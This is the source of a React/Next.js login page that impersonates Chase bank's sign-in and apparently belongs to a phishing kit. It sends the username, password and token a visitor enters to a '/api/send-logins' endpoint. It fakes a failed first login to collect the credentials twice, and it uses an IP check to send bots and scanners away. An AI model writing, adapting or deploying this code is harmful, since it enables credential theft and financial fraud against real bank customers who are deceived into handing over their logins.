import { Link } from "@mui/material";
import { Box } from "@mui/system";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import KeyboardArrowRightIcon from "@mui/icons-material/KeyboardArrowRight";
import axios from "axios";
import Head from "next/head";
import { CustomInput } from "../components/CustomInput";
import { CustomButton } from "../components/CustomButton";
import { CustomError } from "../components/CustomError";
import { CustomCheckbox } from "../components/CustomCheckbox";
import { Wrapper } from "../components/Wrapper";
import { useRouter } from "next/router";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface LoginProps {}

export const Login: React.FC<LoginProps> = ({}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm({
    mode: "onTouched",
  });

  const [loading, setLoading] = useState(false);
  const [showUseToken, setShowUseToken] = useState(false);
  const [error, setError] = useState({
    show: false,
    message: "",
  });
  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const [loginAttempt, setLoginAttempt] = useState(
    datas && datas.logins ? Object.keys(datas.logins).length : 0
  );

  const { push } = useRouter();

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`form`, `LOGIN`);
    formData.append(
      `loginDetails`,
      JSON.stringify({
        loginAttempt: loginAttempt + 1,
        sessionId: datas.sessionId,
        ...data,
      })
    );

    try {
      await axios.post(`/api/send-logins`, formData);
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    setData({
      ...datas,
      logins: {
        ...(datas && datas.logins ? datas.logins : {}),
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN`,
          loginDetails: {
            loginAttempt:
              datas && !datas.logins
                ? 1
                : Object.keys(datas ? datas.logins : []).length,
            ...data,
          },
        },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setError({
        show: true,
        message: `We can't find that username and password. You can <a href="#">reset your password</a> or try again.<br><br>Keep in mind: You won't be able to see your statements and notices until you reset your password.`,
      });
      reset();
      return;
    }

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper showProgress={false}>
      <Box component="main" display="block">
        <Head>
          <title>Sign in - chase.com</title>
        </Head>
        <Box
          sx={{
            marginRight: "auto",
            marginLeft: "auto",
            paddingLeft: "12px",
            paddingRight: "12px",
            fontSize: "16px",
            width: ["100%", "744px", "964px", "1164px"],
          }}
        >
          <Box>
            <Box>
              <Box
                sx={{
                  height: "100%",
                  width: "100%",
                  padding: 0,
                  margin: 0,
                  backgroundSize: "cover",
                  backgroundRepeat: "no-repeat",
                  backgroundPosition: "center center",
                  position: "fixed",
                  top: 0,
                  left: 0,
                  zIndex: -1,
                  backgroundColor: "#003c69!important",
                  backgroundImage: [
                    "url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg)",
                    "url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.1.jpeg)",
                    "url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.1.jpeg)",
                    "url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.1.jpeg)",
                  ],
                  display: "inline-block",
                  verticalAlign: "middle",
                  maxWidth: "100%",
                }}
              />
              <Box
                sx={{
                  marginLeft: "-12px",
                  marginRight: "-12px",
                  "::before": {
                    display: "table",
                    content: "' '",
                  },
                  "::after": {
                    clear: "both",
                    display: "table",
                    content: '" "',
                  },
                }}
              >
                <Box
                  sx={{
                    marginTop: ["10px", "60px", "60px", "80px"],
                    marginLeft: [0, "25%"],
                    width: ["100%", "50%"],
                    float: "left",
                    position: "relative",
                    minHeight: ".0625rem",
                    paddingLeft: "12px",
                    paddingRight: "12px",
                  }}
                >
                  <Box
                    sx={{
                      background: "rgba(255,255,255,.96)",
                      borderRadius: "5px",
                      padding: "1.25rem 0 1.25rem 0",
                      maxWidth: "384px!important",
                      overflow: "visible!important",
                      margin: "0 auto",
                      borderTop: ".3125rem transparent solid",
                    }}
                  >
                    <Box
                      sx={{
                        marginLeft: "-12px",
                        marginRight: "-12px",
                        "::before": {
                          display: "table",
                          content: "' '",
                        },
                        "::after": {
                          clear: "both",
                          display: "table",
                          content: '" "',
                        },
                      }}
                    >
                      <Box
                        sx={{
                          marginLeft: "8.33333333%",
                          width: "83.33333333%",
                          float: "left",
                          position: "relative",
                          minHeight: ".0625rem",
                          paddingLeft: "12px",
                          paddingRight: "12px",
                        }}
                      >
                        <Box component="form">
                          {(Object.keys(errors).length || error.show) && (
                            <CustomError
                              message={`${
                                error.message ||
                                "Please tell us your username and password."
                              }`}
                            />
                          )}
                          <CustomInput
                            label="username"
                            name="username"
                            errors={errors}
                            register={register("username", {
                              required:
                                "A username must be entered. Please enter your username",
                            })}
                            addMarginTop
                          />
                          <CustomInput
                            label="password"
                            name="password"
                            type="password"
                            errors={errors}
                            register={register("password", {
                              required:
                                "A password must be entered. Please enter your password.",
                            })}
                          />
                          {showUseToken && (
                            <CustomInput
                              label="token"
                              name="token"
                              type="token"
                              errors={errors}
                              register={register("token", {
                                required:
                                  "A toke must be entered. Please enter your token.",
                              })}
                            />
                          )}
                          <Box
                            sx={{
                              marginLeft: "-12px",
                              marginRight: "-12px",
                              "::before": {
                                display: "table",
                                content: "' '",
                              },
                              "::after": {
                                clear: "both",
                                display: "table",
                                content: '" "',
                              },
                            }}
                          >
                            <CustomCheckbox
                              label="Remember me"
                              errors={errors}
                            />
                            <CustomCheckbox
                              label="Use token"
                              errors={errors}
                              floatRight
                              onChange={(e) => {
                                setShowUseToken(e.target.checked);
                              }}
                            />
                          </Box>
                          <CustomButton
                            text="Sign in"
                            disabled={loading}
                            onClick={onSubmit}
                          />
                          <Box
                            sx={{
                              marginLeft: "-12px",
                              marginRight: "-12px",
                              "::before": {
                                display: "table",
                                content: "' '",
                              },
                              "::after": {
                                clear: "both",
                                display: "table",
                                content: '" "',
                              },
                            }}
                          >
                            <Box
                              component="span"
                              sx={{
                                fontSize: [".8125rem", ".875rem"],
                                fontWeight: 400,
                                color: "#126bc5",
                                letterSpacing: 0,
                                textDecoration: "none",
                              }}
                            >
                              <Link
                                href="#"
                                sx={{
                                  lineHeight: "1.6rem",
                                  whiteSpace: "normal",
                                  textDecoration: "none",
                                  position: "relative",
                                  fontSize: ".875rem",
                                  fontWeight: 400,
                                  letterSpacing: 0,
                                  display: "flex",
                                  alignItems: "center",
                                }}
                              >
                                Forgot username/password?
                                <KeyboardArrowRightIcon color="primary" />
                              </Link>
                            </Box>
                          </Box>
                          <Box
                            sx={{
                              marginLeft: "-12px",
                              marginRight: "-12px",
                              "::before": {
                                display: "table",
                                content: "' '",
                              },
                              "::after": {
                                clear: "both",
                                display: "table",
                                content: '" "',
                              },
                            }}
                          >
                            <Box
                              component="span"
                              sx={{
                                fontSize: [".8125rem", ".875rem"],
                                fontWeight: 400,
                                color: "#126bc5",
                                letterSpacing: 0,
                                textDecoration: "none",
                              }}
                            >
                              <Link
                                href="#"
                                sx={{
                                  lineHeight: "1.6rem",
                                  whiteSpace: "normal",
                                  textDecoration: "none",
                                  position: "relative",
                                  fontSize: ".875rem",
                                  fontWeight: 400,
                                  letterSpacing: 0,
                                  display: "flex",
                                  alignItems: "center",
                                }}
                              >
                                Not Enrolled? Sign Up Now.
                                <KeyboardArrowRightIcon color="primary" />
                              </Link>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Login;
